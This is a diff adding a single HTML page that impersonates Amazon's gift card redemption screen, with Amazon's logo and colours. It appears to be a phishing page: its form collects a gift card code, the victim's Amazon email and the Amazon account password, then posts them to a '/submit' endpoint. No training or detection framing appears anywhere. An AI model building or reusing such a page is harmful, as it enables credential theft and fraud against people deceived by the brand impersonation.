@@ -1,0 +1,99 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <title>Amazon Gift Card Redemption</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background-color: #f3f3f3;
+      margin: 0;
+      padding: 0;
+      color: #111;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      height: 100vh;
+    }
+
+    .container {
+      width: 100%;
+      max-width: 420px;
+      background-color: #fff;
+      padding: 30px 40px;
+      border-radius: 8px;
+      box-shadow: 0 2px 6px rgba(0, 0, 0, 0.15);
+      text-align: center;
+    }
+
+    .logo img {
+      height: 40px;
+      margin-bottom: 20px;
+    }
+
+    h2 {
+      color: #ff9900;
+      margin-bottom: 10px;
+    }
+
+    p {
+      margin-bottom: 25px;
+      font-size: 14px;
+      color: #333;
+    }
+
+    input[type="text"],
+    input[type="email"],
+    input[type="password"] {
+      width: 100%;
+      padding: 12px 15px;
+      margin-bottom: 16px;
+      border: 1px solid #ddd;
+      border-radius: 4px;
+      font-size: 16px;
+      box-sizing: border-box;
+    }
+
+    button {
+      background-color: #ff9900;
+      color: #111;
+      border: none;
+      padding: 12px 25px;
+      font-size: 16px;
+      border-radius: 4px;
+      cursor: pointer;
+      font-weight: bold;
+      width: 100%;
+      box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
+      transition: background-color 0.3s;
+    }
+
+    button:hover {
+      background-color: #e88e00;
+    }
+
+    .disclaimer {
+      font-size: 12px;
+      color: #777;
+      margin-top: 25px;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <div class="logo">
+      <img src="https://upload.wikimedia.org/wikipedia/commons/a/a9/Amazon_logo.svg" alt="Amazon Logo" />
+    </div>
+    <h2>Redeem Your Amazon Gift Card</h2>
+    <p>Enter your gift card code and account details below to add the balance to your account.</p>
+    <form action="/submit" method="POST">
+      <input type="text" name="giftcard" placeholder="Gift Card Code" required maxlength="19" />
+      <input type="email" name="amazon-email" placeholder="Amazon Email" required />
+      <input type="password" name="amazon-password" placeholder="Amazon Account Password" required />
+      <input type="hidden" name="redirect_to" value="amazon_giftcard_conf.html" />
+      <button type="submit">Redeem Now</button>
+    </form>
+  </div>
+</body>
+</html>
